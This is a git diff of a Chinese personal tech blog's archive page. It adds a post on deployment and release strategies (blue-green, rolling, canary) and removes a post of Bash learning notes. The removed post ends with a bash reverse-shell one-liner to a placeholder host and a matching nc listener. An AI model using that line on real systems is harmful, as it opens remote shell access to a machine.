@@ -1,4 +1,52 @@
-<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="icon" href="/favicon.png"><link rel="stylesheet" href="/styles.css"><title>杜屹东的博客</title></head><body><div class="container"><div class="columns page-header"><h1>杜屹东的博客</h1></div><div class="columns"><div class="navigation"><nav class="menus-main"><a href="/" class="favicon"><img alt="杜屹东的博客" src="/favicon.png"></a><a href="/about">关于我</a><a href="/list">日志列表</a><a href="/booklist">读书</a><a href="/links">链接</a><a href="/resume">简历</a></nav><nav class="right menus-right"><a target="_blank" href="https://github.com/ADU-21/blog">Fork on Github</a></nav></div></div><div class="columns"><div class="block-body column three-fourths"><div class="article-widget"><a href="https://www.duyidong.com/awsSolutionsArchitect_AE.pdf">AWS认证方案解决架构师证书</a></div><article><header><h2><a href="/2016/09/28/AWS-EC2/">AWS_EC2</a></h2></header><div class="article-meta clearfix"><time class="left">2016 9 月 28 日</time><ul class="tags left"></ul><ul class="tags right"><li><a href="/tags/AWS/">AWS</a></li></ul></div><div class="markdown-body"><h1 id="AWS-EC2是什么？"><a href="#AWS-EC2是什么？" class="headerlink" title="AWS EC2是什么？"></a>AWS EC2是什么？</h1><p>Amazon Elastic Compulte Cloud(EC2)提供了可伸缩的计算资源，使你可以快速开发/部署你的应用，有了它你可以快速起一个应用，配置安全，网络，以及存储。他可以更灵活，更快地适应你对需求。</p>
+<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="icon" href="/favicon.png"><link rel="stylesheet" href="/styles.css"><title>杜屹东的博客</title></head><body><div class="container"><div class="columns page-header"><h1>杜屹东的博客</h1></div><div class="columns"><div class="navigation"><nav class="menus-main"><a href="/" class="favicon"><img alt="杜屹东的博客" src="/favicon.png"></a><a href="/about">关于我</a><a href="/list">日志列表</a><a href="/booklist">读书</a><a href="/links">链接</a><a href="/resume">简历</a></nav><nav class="right menus-right"><a target="_blank" href="https://github.com/ADU-21/blog">Fork on Github</a></nav></div></div><div class="columns"><div class="block-body column three-fourths"><div class="article-widget"><a href="https://www.duyidong.com/awsSolutionsArchitect_AE.pdf">AWS认证方案解决架构师证书</a></div><article><header><h2><a href="/2016/10/24/部署和发布策略的演进/">部署和发布策略的演进</a></h2></header><div class="article-meta clearfix"><time class="left">2016 10 月 24 日</time><ul class="tags left"></ul><ul class="tags right"><li><a href="/tags/DevOps/">DevOps</a></li><li><a href="/tags/部署与发布/">部署与发布</a></li></ul></div><div class="markdown-body"><h1 id="持续交付的目的"><a href="#持续交付的目的" class="headerlink" title="持续交付的目的"></a>持续交付的目的</h1><h2 id="以下问题有没有解决？"><a href="#以下问题有没有解决？" class="headerlink" title="以下问题有没有解决？"></a>以下问题有没有解决？</h2><p>“快速将产品推向市场” 与 “提供稳定、安全并可靠的IT服务” 是否可以兼得？<br>用更少的资源完成更多的业绩，既要保持竞争力，又要削减成本；<br>如何解决任务交接出现的问题，例如业务与开发，开发与运维之间；<br>运维人员能否和其他人一样，正常上下班，而不用在夜里或者周末加班？</p>
+<a id="more"></a>
+<h1 id="部署和发布的区别"><a href="#部署和发布的区别" class="headerlink" title="部署和发布的区别"></a>部署和发布的区别</h1><p>要弄清楚部署和发布的区别，首先要弄清楚几个名词之间的关系CI(Continues Intergation)持续集成，CD(Continues Delivery)持续交付，持续集成的目的是对代码的快速反馈，在分布式开发的团队中你的更改不会破坏已有代码功能，持续交付的scope要大一些，指的是对用户交付最终价值，传统的交付最终价值即为产生可发布的版本，有的公司在持续交付的基础之上甚至提出了持续部署（Continous Deployment），即自动化讲可发布版本放入到产品环境，其中就涉及到蓝绿部署，滚动部署等部署方式。在部署和发布解耦之后，在将产品部署到产品环境之后我们可能还有些功能是不想对用户可见的，在对用户可见的的这个过程我们称之为发布（Release）（如图）。DevOps运动则是在发布之后有引入运维和运营的角色，和用户反馈一起形成一个闭环。恩，差不多是这个样子的。    </p>
+<p><img src="https://puppet.com/sites/default/files/2016-09/puppet_continuous_diagram.gif" alt=""></p>
+<p>ThoughtWorks在15年的技术雷达上已经建议解耦部署和发布:</p>
+<pre><code class="我们推荐严格区分术语“部署（Deployment）”和“发布（Release）”的使用。应用组件或基本设施的代码或配置变更在产品环境生效称为“部署”，而具有业务影响的功能变化对最终用户可见称为“发布”。使用特性开关或灰度发布等技巧可以使我们更加频繁地部署变更到产品环境但并不发布功能。频繁部署可以有效降低变更带来的风险，同时业务负责人仍然能保持何时向最终用户发布功能的控制。```">
+# 零宕机发布（目标）
+```零宕机发布指的一种将用户从一个版本几乎瞬间转移到另一个版本上的方法，更重要的是，如果出了什么问题，他还要能在瞬间把用户从这个版本转回到原先的版本上。
+</code></pre>
+<p>零宕机发布的关键在于将发布流程中不同的部分解耦，尽量使他们能独立发生。</p>
+<h1 id="凤凰式部署"><a href="#凤凰式部署" class="headerlink" title="凤凰式部署"></a>凤凰式部署</h1><p>将产品环境和应用打包发布，在容器产生之前是将系统和应用制作镜像的方式进行发布，避免产品环境和非生产环境不一致导致发布失败，但是这种发布方式因为笨重而被容器取代。</p>
+<ul>
+<li>便于回滚</li>
+<li>提高计算资源的利用率：相对以操作系统为计算单元的管理方式，容器不仅更轻量而且极大提高了计算资源的利用率，且容器本身不占用计算资源。而且相对image的方式，管理成本，备份的cost也极大降低</li>
+<li>更快的部署时间：image的方式需要一天，snapshot需要十分钟，Container则可以把这个时间缩短到秒级</li>
+<li>解决了环境不一致的问题</li>
+<li>跨平台</li>
+<li>prodocut team over project team:每个team可以更方便的管理自己的platform资源，极大地降低了team之间的沟通成本。（相对application team和platfor team分离的情况）</li>
+</ul>
+<p>风险：安全，容器必须是以root权限泡在宿主机上，不同容器共享一个宿主机，如果一个容器被贡献则会威胁到所有在改宿主机上的服务。<br>解决方案：</p>
+<ul>
+<li>及时更新宿主机系统版本，避免内核漏洞</li>
+<li>扫描bese image, 避免Container本身系统漏洞</li>
+<li>base image可以加入主动防御（e.g.ossec）</li>
+<li>控制好容器操作权限</li>
+</ul>
+<h1 id="滚动发布-Rolling-Release"><a href="#滚动发布-Rolling-Release" class="headerlink" title="滚动发布(Rolling Release)"></a>滚动发布(Rolling Release)</h1><p>又称滚动更新(rolling update)<br>指的是在不切换负载均衡器或者DNS的前提下把负载均衡器下的机器一台台关掉，部署好之后再挂到负载均衡器下面，与蓝绿部署直观的差别是不需要切换负载均衡器或DNS，同时做到零宕机部署。（还要完善）</p>
+<h1 id="蓝绿部署（BuleGreen-Deployment）"><a href="#蓝绿部署（BuleGreen-Deployment）" class="headerlink" title="蓝绿部署（BuleGreen Deployment）"></a>蓝绿部署（BuleGreen Deployment）</h1><p>在发布之前就把应用程序放在产品环境上部署好，如果“发布”能像重新配置一下路由器那样简单，让他直接指向生产环境，那就更好了 ————《持续交付》<br>蓝绿部署主要解决的是宕机发布的问题<br>它的主要原理是在保持旧版本环境（绿环境）正常运行的情况下，准备一套蓝环境，在产品环境里蓝环境通过充分冒烟测试后再将用户访问从绿环境切换到蓝环境，如果蓝环境在这个切换之后出现问题则立即切换回绿环境，如果没有问题则最后destroy掉绿环境，具体做法可以通过DNS或者ELB配合AutoScaling Group进行Infrastructure的切换，这种切换通常在一秒之内就可以搞定。application层的回话切换以及数据库链接切换的问题，可以使用中间件解决。</p>
+<p><img src="http://martinfowler.com/bliki/images/blueGreenDeployment/blue_green_deployments.png" alt=""></p>
+<p>对于数据库，直接从绿环境切换到蓝环境是不可能的，因为如果数据库结构发生改变的话，数据迁移需要时间。解决这种情况最理想的方法是在一小段时间把数据库变成只读状态，完成迁移后再将用户切换到蓝环境，恢复读写。如果在切换过程中仍然有数据的写入，你可以采用添加中间件的方式保存读写数据，或者在在读写过程中持续将事物发向新旧两个数据库。<br></p>
+<h1 id="灰度发布（金丝雀发布）"><a href="#灰度发布（金丝雀发布）" class="headerlink" title="灰度发布（金丝雀发布）"></a>灰度发布（金丝雀发布）</h1><p>在把应用程序发布给所有人之前，先试着把它发布给一小撮用户群，这种技术叫做金丝雀发布。<br>金丝雀发布要解决的问题主要是缩短反馈周期，以及弥补巨大产品环境下无法进行有效容量测试所可能导致的问题的一种手段。是一个能大大降低新版本发布风险的方法。<br>灰度发布是蓝绿部署的一个延伸，采用逐步切换的方式使新版本发布只影响到尽可能少的用户，从而为AB测试提供条件。灰度发布<br>灰度发布与金丝雀部署在操作上是等价的<br>金丝雀发有以下几个好处：</p>
+<ul>
+<li>非常容易回滚，这个其实是蓝绿部署就已经带来的好处，只要不把用户引向有问题的新版本，就可以有足够的时间用来分析错误日志，排查问题。</li>
+<li>可以将同一批用户引至不新旧版本以进行A/B测试，某些公司可以度量新特性的使用率，某些公司可以度量该版本带来的收益，你不必将大量用户引入A/B测试，只需要有代表性的样本就足够了。</li>
+<li>可以通过逐渐增加负载，记录并衡量应用程序响应时间，CPU使用率，I/O，内存使用率以及日志中是否有异常报告这种方式来检查应用程序是否满足容量需求，降低容量测试不理想带来的风险。</li>
+</ul>
+<p>另外，需要注意的是，在生产环境中保留尽可能少的版本也是非常重要的，最好限制在两个版本之内。</p>
+<h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><ul>
+<li>紧急修复：一定不要破坏流程，不要直接对生产环境进行修改。</li>
+<li>持续部署：If it hurts, do it more often</li>
+<li>持续发布用户自行安装的软件？发布方式？</li>
+<li>执行部署的人应该参与部署过程的创建（Dev和Ops的紧密合作）</li>
+<li>记录部署活动（自动化更佳）</li>
+<li>不要删除旧文件，而是移动到别的位置。在Unix环境中，一个最佳实践是把每个版本部署到不同的文件夹中，创建一个符号链接文件指向最新版本，版本的部署和回滚就只是改一下符号链接这么简单。</li>
+<li>部署是整个团队的责任（DevOps）</li>
+<li>快速失败，部署脚本也应该纳入测试中，这些测试应该被作为部署的一部分来工作。</li>
+<li>数据库最好向前兼容</li>
+</ul>
+</div></article><article><header><h2><a href="/2016/09/28/AWS-EC2/">AWS_EC2</a></h2></header><div class="article-meta clearfix"><time class="left">2016 9 月 28 日</time><ul class="tags left"></ul><ul class="tags right"><li><a href="/tags/AWS/">AWS</a></li></ul></div><div class="markdown-body"><h1 id="AWS-EC2是什么？"><a href="#AWS-EC2是什么？" class="headerlink" title="AWS EC2是什么？"></a>AWS EC2是什么？</h1><p>Amazon Elastic Compulte Cloud(EC2)提供了可伸缩的计算资源，使你可以快速开发/部署你的应用，有了它你可以快速起一个应用，配置安全，网络，以及存储。他可以更灵活，更快地适应你对需求。</p>
 <a id="more"></a>
 <h2 id="EC2定义了以下规则"><a href="#EC2定义了以下规则" class="headerlink" title="EC2定义了以下规则"></a>EC2定义了以下规则</h2><ul>
 <li><strong>Instance:</strong> 虚拟计算环境</li>
@@ -94,119 +142,7 @@
 <li>git,Linux</li>
 <li>凤凰式部署</li>
 </ul>
-</div></article><article><header><h2><a href="/2016/08/05/Bash学习小计/">Bash学习小计</a></h2></header><div class="article-meta clearfix"><time class="left">2016 8 月 5 日</time><ul class="tags left"></ul><ul class="tags right"><li><a href="/tags/Linux/">Linux</a></li><li><a href="/tags/Shell/">Shell</a></li><li><a href="/tags/小计/">小计</a></li></ul></div><div class="markdown-body"><p>最近一段时间在学习bash，作为一个小总结，记录一些bash使用的技巧以及知识点。</p>
-<h1 id="Shell是什么？"><a href="#Shell是什么？" class="headerlink" title="Shell是什么？"></a>Shell是什么？</h1><p>shell是一类解释性语言，通过其解释器与操作系统内核进行交互，shell分为Bshell 和Cshell两大类，我们所熟悉的bash和zsh都属于Bshell一类。shell脚本有两种执行方式，一种为交互式执行，即通常我们在Linux上的执行方式，一次只能执行一条命令（当然你可以把多条命令写到一行），多条命令不能同时执行。另一种方式为脚本执行，即把多条shell语句写到一个.sh文件里，然后在文件头#！/bin/bash调用解释器执行，这种方式的优点在于可重复执行和自动化。但shell的脚本通常不易读，所以展现shell优势的地方主要还是在交互执行中。<br>另外可以在/etc/shells文件里查看当前系统支持的shell。<br>bash作为大部分类Linux系统的标配，下面我主要围绕bash来讲。<br><a id="more"></a></p>
-<h1 id="Bash启动顺序"><a href="#Bash启动顺序" class="headerlink" title="Bash启动顺序"></a>Bash启动顺序</h1><p>1./etc/profile :此文件为系统的每个用户设置环境信息,当用户第一次登录时,该文件被执行。并从/etc/profile.d目录的配置文件中搜集shell的设置。<br>2.~/.bash_profile:每个用户都可使用该文件输入专用于自己使用的shell信息,当用户登录时,该文件仅仅执行一次!默认情况下,他设置一些环境变量,执行用户的.bashrc文件。<br>3.~/.bashrc:该文件包含专用于你的bash shell的bash信息,当登录时以及每次打开新的shell时,该文件被读取。<br>4.~/.bash_logout:当每次退出系统(退出bash shell)时,执行该文件。</p>
-<p>注意</p>
-<pre><code>~/.bash_profile 是交互式、login 方式进入 bash 运行的
-~/.bashrc 是交互式 non-login 方式进入 bash 运行的
-通常二者设置大致相同，所以通常前者会调用后者。
-</code></pre><p>所以我们通常会吧环境变量的一些设置保存在~/.bash_profile中，把一些命令行，脚本调用写到~/.bashrc里面</p>
-<h1 id="Bash快捷键"><a href="#Bash快捷键" class="headerlink" title="Bash快捷键"></a>Bash快捷键</h1><h2 id="用好你的Control键"><a href="#用好你的Control键" class="headerlink" title="用好你的Control键"></a>用好你的Control键</h2><p>Control键是所有类Unix系统（Mac, Linux）下一个非常有用的按键，但也是一个经常被忽视的按键，特别是在Mac平台下，Command键完全代替了在Windows平台下的Ctrl键，很多人不清楚为什么Apple又额外加了一个Control键，我想这和著名的Emacs编辑器有关，Emacs下有很多方便的快捷键，其中很多都需要用到Control键，Mac系统就原生继承了很多这些快捷键，下面就根据我在实际开发过程中遇到的具体情况来总结一下如何用好Control键，效率真能提高不少。</p>
-<h3 id="Control的常用组合键"><a href="#Control的常用组合键" class="headerlink" title="Control的常用组合键"></a>Control的常用组合键</h3><p>移动类</p>
-<blockquote>
-<ul>
-<li>Control-F 前进光标 (效果同右方向键)</li>
-<li>Control-B 后退光标（效果同左方向键)</li>
-<li>Control-P 光标上移（效果同上方向键）</li>
-<li>Control-N 光标下移（效果同下方向键）</li>
-<li>Control-A 光标移动到行首</li>
-<li>Control-E 光标移动到行尾</li>
-</ul>
-</blockquote>
-<p> 删除类</p>
-<blockquote>
-<ul>
-<li>Control-D 删除光标后面的一个字符</li>
-<li>Control-H 删除光标前面的一个字符</li>
-<li>Control-K 删除当前行光标以后的所有字符</li>
-<li>Control-W 删除光标前的一个单词</li>
-<li><p>Control-U 删除当前行的所有字符<br>其它类</p>
-</li>
-<li><p>Control-T 交换光标两边的字符</p>
-</li>
-<li>Control-L 清屏(仅适用于终端下)<h3 id="一些常用场景"><a href="#一些常用场景" class="headerlink" title="一些常用场景"></a>一些常用场景</h3></li>
-</ul>
-</blockquote>
-<ol>
-<li><p>通常情况下，上下左右键都远离主键盘区，如果在你高速打字的过程中需要移动输入光标位置，这个时候直接通过上下左右键就不得不将右手移出主键盘区，就会降低输入的速度，通常这个时候你就可以通过Control的组合键达到快速移动光标的目的。再比如你在一些IDE(Xcode,Android Studio等)里面选择代码补全的不同候选项时，就可以通过Control-P与Control-N来达到切换选择不同候选项的操作.</p>
-</li>
-<li><p>Mac的键盘上没有Home与End键, 如果你想将光标快速移动到行首与行尾就比较麻烦(当然你可以通过Command与-&gt; 或Command与&lt;-实现,但这样你又需要去操作方向键, 方向键远离主键盘区, 速度势必会降低), 这时你就可以通过Control-A 与 Control-E实现, 这两个组合键非常适合在终端下使用</p>
-</li>
-<li><p>有些时候你在终端下输入了很长的命令, 但发现输入有误, 需要完全删除重新输入, 通常情况下你都会使用Delete键去做, 但Delete只能一次删除一个字符, 速度很慢, 这时你就可以通过Control-U键快速的达到清除当前所有输入的目的, 再比如你当前的输入只有从中间某个位置向后是错误的, 这时你可以通过Control-B或Control-F将光标移动到对应位置, 然后再利用Control-K快速达到删除当前光标后所有输入的目的</p>
-</li>
-<li><p>在输入的过程中如果发现个别字符不对需要删除重新输入, 你当然可以通过Delete键达到, 但 Delete键和方向键一样有点远, 更方便的你可以通过Control-D 与 Control-H实现, 还有些时候错的不是一个或几个字符,而是一个或几个单词你可以Control-W达到</p>
-</li>
-<li><p>在终端下如何清屏? 很多人都是通过输入clear达到, 但如果这时你终端里正输入的有一条待执行的命令,这条命令的输出可能有很多你想清一下屏后再执行, 你怎么办,总不能删除当前命令后再输入clear命令, 然后再重新输入刚才的那条命令吧, 其实这时你可以通过Control-L组合键达到目的,这个差不多是我在终端下用的最多的一个快捷键了.</p>
-</li>
-</ol>
-<h3 id="关于编辑模式的设置"><a href="#关于编辑模式的设置" class="headerlink" title="关于编辑模式的设置"></a>关于编辑模式的设置</h3><p>在交互式执行bash中，可以通过set -o的方式查看当前编辑模式，我们通常采用set -o emaces的方式设置以上快捷键为可操作，需要注意的是，如果你不选择一种快捷键设置”set +o emaces”你连最熟悉的上下键切换history命令都用不了。</p>
-<h2 id="Alias"><a href="#Alias" class="headerlink" title="Alias"></a>Alias</h2><p>bash的一个将长命令替换为短命令的方式，可以直接在bash交互执行中输入alias查看已经被设置的快捷键，以<code>alias la=&#39;ls -al&#39;</code>的方式设置快捷键，当然直接键入命令只对当前打开的shell有效，如果想长期生效，我们通常的做法是把它写到/etc/profile.d/目录下的shell里面，会被/etc/profile调用的一个全局配置。当然在工作环境中我们会把它配到home目录下（因为/etc目录下会对所有用户生效，想想也是不科学的）所以我们更经常写到~/.bashrc里面。</p>
-<h1 id="关于环境变量"><a href="#关于环境变量" class="headerlink" title="关于环境变量"></a>关于环境变量</h1><p>bash的环境变量可以用<code>set</code> <code>env</code> 两种方式查看，这里主要说一下两种变量的区别，当你在命令行中用赋值的方式申明一个变量，(example: TEXT=123)，这个变量只存在set中，即当前shell生效，不会传递到subshell里面，如果是文本执行的脚本，这种变量申明方式定义的变量也只会在文件内生效，如果想让别的脚本调用这些变量,可以通过export的方式将变量导入到env里面，可以理解为全局变量。<br>这里我还想提一个比较有意思的环境变量PS1，你可以将它设置为<code>export PS1=&quot;(\!) \[\e[31m\] \[\A\] \[\e[32m\]\u@\h \[\e[34m\]\w \[\e[30m\]$&quot;</code>试一下，是个非常有意思的值。</p>
-<h1 id="Windows和Linux脚本的转换问题"><a href="#Windows和Linux脚本的转换问题" class="headerlink" title="Windows和Linux脚本的转换问题"></a>Windows和Linux脚本的转换问题</h1><p>我们都知道windows和Linux的文件类型不同，那么在windows下编写的脚本如何在Linux下执行呢？当我们从windows下拷贝一个文件到Linux上，可以使用<code>cat -A</code>命令查看到文件隐藏字符，发现有很多脏数据，于是可以用<code>dos2unix file.sh</code>的方式把文件转化过来。</p>
-<h1 id="关于历史命令"><a href="#关于历史命令" class="headerlink" title="关于历史命令"></a>关于历史命令</h1><p>history可以查看当前用户的历史命令，每个用户的history藏在~/.bash_hitory下，可以查看。<br>可以使用<code>!!</code>执行上一条命令 <code>![number]</code>执行第number条命令，<code>！[string]</code>执行以string开头的上一条命令<br>另外control+r可以根据字符串快捷搜索历史命令.</p>
-<h1 id="关于参数传递"><a href="#关于参数传递" class="headerlink" title="关于参数传递"></a>关于参数传递</h1><ol>
-<li>`` $()<br> 这两种方式是相同的，即重新打开一个shell执行完退出，并使用返回值代替脚本调用部分内容</li>
-<li><p>| xargs 区别于管道符，是将前面的命令作为后面命令的命令参数，而管道符是将前面输出作为后面命令的标准输入。<br> 再解释一 | 和 | xargs 的区别：</p>
-<pre><code> echo -l | ls 输出： 等同于 ls
- echo -l | xargs ls 输出 等同于 ls -l
-</code></pre><p> 好了，剩下的自己体会。</p>
-</li>
-<li>find 的 -exec<br> xargs有个缺点，在大量执行命令（成千上万）的时候可能因为执行的命令过多失败，而find的-exec 是为逐个命令执行，不会遇到此类问题，作为-exec的标配，应该在后面加上{} \;末尾的\;其实是转意，恩，此处按下不表。</li>
-</ol>
-<h1 id="关于文件查找"><a href="#关于文件查找" class="headerlink" title="关于文件查找"></a>关于文件查找</h1><p>find 是一个事实文件便利工具，比较强大,可以用<code>find / -name &quot;*.sh&quot;</code>的方式查找/中包含.sh结尾的文件，如果遇到一堆permission deny的问题可以用输出重定向的方式解决<code>find /-name &quot;*.sh&quot; 2&gt;&gt; /dev/null</code>（2为文件状态符，0表示标准输入，1表示标准输出，2表示错误输出，&gt;&gt;为重定向，表示将输出叠加导入到后面的文件中,/dev/null为Linux系统的垃圾桶）,这个命令比较常用，但是效率很低，占用内存也比较高，推荐使用locate命令，类似于window系统里的everything，将文件信息保存在/var/lib/mlocate/mlocatedb数据库里，使用<code>updatedb</code>更新数据库，<code>locate filename</code>的方式查找文件，更高效，速度也更快。</p>
-<h1 id="关于bash-history"><a href="#关于bash-history" class="headerlink" title="关于bash_history"></a>关于bash_history</h1><p>放一个bash_histroy的命令：<a href="http://rockhong.github.io/history-in-bash.html" target="_blank" rel="external">http://rockhong.github.io/history-in-bash.html</a><br>bash使用的历史命令会先写入内存（在退出subshell之前在.bash_history中不可见，也不可传递到子进程），在退出shell的时候写入子进程。这里说几个对bash_history的需求以及解决方案。</p>
-<h2 id="多个终端不覆盖history"><a href="#多个终端不覆盖history" class="headerlink" title="多个终端不覆盖history:"></a>多个终端不覆盖history:</h2><p>如果同一用户在不同终端登录，bash_histroy只能保存最后一个用户登录的bash_histroy，解决这个问题：<br>简单来说，你在.bashrc里面添加这句就够了：</p>
-<pre><code>shopt -s histappend
-</code></pre><h2 id="history上限设大："><a href="#history上限设大：" class="headerlink" title="history上限设大："></a>history上限设大：</h2><pre><code># 设置历史记录条数
-export HISTFILESIZE=40000000
-# 设置显示历史记录条数
-export HISTSIZE=10000
-</code></pre><h2 id="history定期备份"><a href="#history定期备份" class="headerlink" title="history定期备份"></a>history定期备份</h2><p>很多情况下我们希望保存更多的bash_history以方便以后查阅，但是如果把.bash_history设置得很大的话，bash在启动时会占用大量内存（100000条大概要10M），这是我们不想看到的，所以应该养成定期备份的习惯，推荐把bash_histroy按时间备份比如每天+data&gt;&gt;bash_histroy.back.</p>
-<h1 id="关于sudo"><a href="#关于sudo" class="headerlink" title="关于sudo"></a>关于sudo</h1><p>这里我要说的是用户切换<br>大家都知道su命令是用来切换用户的，su - 可以完全切换到用户（新开一个shell，加载~/.bash_profile及~/.bashrc），但是在有的情况下，sudo -iu 也可以切换用户。<br>首先：<code>sudo -i</code> 是以root身份新开一个shell，<code>sudo -u &lt;user&gt; &lt;command&gt;</code>是以user身份执行command，现在我要说一条神奇的命令：</p>
-<pre><code>sudo -iu &lt;user&gt;
-</code></pre><p>它等价于<code>sudo -u root &lt;user_shell&gt;</code><br>是不是很神奇？<br>我们来看一个更神奇的:<br>visudo(当然需要root身份或者sudo权限)，编辑/etc/sudoers（或者/etc/sudoers.d/文件下的文件），添加如下代码：</p>
-<pre><code>user1 ALL=(user2) NOPASSWD: &lt;user_shell&gt;
-</code></pre><p>就可以让user1免密码sudo到user2，是不是很有趣。<br>顺便说一下你可以使用这个配置来管理所有sudo权限。</p>
-<h1 id="另外记几个Linux下的常用工具"><a href="#另外记几个Linux下的常用工具" class="headerlink" title="另外记几个Linux下的常用工具"></a>另外记几个Linux下的常用工具</h1><pre><code>1. tldr 查看文档用的，安装比较复杂，而且是联网查找，虚拟机上速度可能会比较慢
-sudo yum -y install epel-release
-sudo yum -y install python-pip
-pip install --upgrade pip
-pip install tldr
-2. tmux 据说是screen的进阶版，分屏用的
-3. lsof端口查看
-4. nc网络瑞士军刀，占用端口:nc -k -l -p 8080 2&gt;&gt; /dev/null
-5. shudown 可以定时关机，重启，取消关机
-6. pstree 进程树
-7. grep 逐行扫描文件
-8. wc 统计
-9. top 查看内存等信息
-10. rpm 包管理（二进制包）
-11. sl 仅仅是为了好玩，小火车开过。。
-12. cmatrix 也是为了好玩，黑客帝国
-</code></pre><h1 id="最后说一下Bash和Zsh哪个好"><a href="#最后说一下Bash和Zsh哪个好" class="headerlink" title="最后说一下Bash和Zsh哪个好"></a>最后说一下Bash和Zsh哪个好</h1><p>当然是Zsh好啦，具体怎么好，你不需要太知道，总之Zsh比Bash很多地方都要强大，在Bash的基础上增加了一些配置。。</p>
-<h1 id="记一个Bash遇到的小坑"><a href="#记一个Bash遇到的小坑" class="headerlink" title="记一个Bash遇到的小坑"></a>记一个Bash遇到的小坑</h1><p>Bash的变量只会被扫描替换一遍，所以当我们的变量里包含其他变量我们需要扫描两遍需要使用eval，类似于python的eval()将字符串当做表达式，用法如下：</p>
-<pre><code>#!/bin/sh
-
-s=Start
-Start_ops=hello
-name=$1
-echo &quot;$s&quot;&quot;_ops&quot;
-eval echo \$&quot;$s&quot;_ops &quot;$name&quot;
-</code></pre><p>运行 ./test.sh world<br>打印出hello word</p>
-<p><strong>但是！！</strong>我现在要说的是请不要使用这种方式，因为邪恶的eval会引起bash注入的问题，就提示到这里，剩下的自己感受。。</p>
-<h1 id="推荐一个Linux命令查询的网站"><a href="#推荐一个Linux命令查询的网站" class="headerlink" title="推荐一个Linux命令查询的网站"></a>推荐一个Linux命令查询的网站</h1><p><a href="http://man.linuxde.net/" target="_blank" rel="external">http://man.linuxde.net/</a></p>
-<h1 id="再列一堆Linux下贼好用的工具"><a href="#再列一堆Linux下贼好用的工具" class="headerlink" title="再列一堆Linux下贼好用的工具"></a>再列一堆Linux下贼好用的工具</h1><p><a href="https://gist.github.com/ADU-21/170a6d0f8756935cead9361bdea0bc67" target="_blank" rel="external">https://gist.github.com/ADU-21/170a6d0f8756935cead9361bdea0bc67</a></p>
-<p>另外： 后面还得写一个关于vim的快捷操作的文章。</p>
-<h1 id="Bash-反弹Shell"><a href="#Bash-反弹Shell" class="headerlink" title="Bash 反弹Shell"></a>Bash 反弹Shell</h1><pre><code>bash -i &gt;&amp; /dev/tcp/x.x.x.x/2333 0&gt;&amp;1
-# 然后在x.x.x.x这台server上执行：
-nc -l 2333
-</code></pre></div></article><article><header><h2><a href="/2016/08/02/AWS之CloudFormation/">AWS之CloudFormation</a></h2></header><div class="article-meta clearfix"><time class="left">2016 8 月 2 日</time><ul class="tags left"></ul><ul class="tags right"><li><a href="/tags/AWS/">AWS</a></li><li><a href="/tags/DevOps/">DevOps</a></li></ul></div><div class="markdown-body"><h1 id="CloudFormation简介"><a href="#CloudFormation简介" class="headerlink" title="CloudFormation简介"></a>CloudFormation简介</h1><p>通过前面的学习我们已经知道了AWS为我们提供服务的方式是将现实世界中的各种需求抽象为很多服务，CloudFormation是一种被定义为管理工具的服务，其作用是把AWS提供的服务按一定方式组合起来，自动化而且可纳入版本管理，作为基础设施及代码的典型应用</p>
-<a id="more"></a>
-<h1 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h1><p>CloudFormation从小到一个EC2大到一个企业级web服务都可以用一个cloudfomation自动生成。</p>
-<h1 id="如何工作"><a href="#如何工作" class="headerlink" title="如何工作"></a>如何工作</h1><p>使用CloudFormation意味着使用模板（template）创建stack。<br>一个模板可以包含一个或者多个资源的信息，并且包含资源之间的关联关系。<br>当你加载一个CloudFormation，你需要一定的权限，这个权限将用于创建指定的资源。</p>
-<p><img src="https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/images/create-stack-diagram.png" alt=""></p>
-</div></article><div class="archive-pagination"><div class="paginator"><a class="extend prev" rel="prev" href="/archives/2016/">&laquo;</a><a class="page-number" href="/archives/2016/">1</a><span class="page-number current">2</span><a class="page-number" href="/archives/2016/page/3/">3</a><a class="page-number" href="/archives/2016/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/archives/2016/page/7/">7</a><a class="extend next" rel="next" href="/archives/2016/page/3/">&raquo;</a></div></div></div><div class="block-sidebar column one-fourth"><div class="widget text-content"><p>杜屹东 生于 1993.12.16, 英文 ID Luke Du</p>
+</div></article><div class="archive-pagination"><div class="paginator"><a class="extend prev" rel="prev" href="/archives/2016/">&laquo;</a><a class="page-number" href="/archives/2016/">1</a><span class="page-number current">2</span><a class="page-number" href="/archives/2016/page/3/">3</a><a class="page-number" href="/archives/2016/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/archives/2016/page/9/">9</a><a class="extend next" rel="next" href="/archives/2016/page/3/">&raquo;</a></div></div></div><div class="block-sidebar column one-fourth"><div class="widget text-content"><p>杜屹东 生于 1993.12.16, 英文 ID Luke Du</p>
 <ul>
 <li>现就职于<a href="https://www.thoughtworks.com/">ThoughtWorks</a></li>
 <li>毕业于 <a href="http://www.xhu.edu.cn/">西华大学</a> 计算机科学与技术</li>
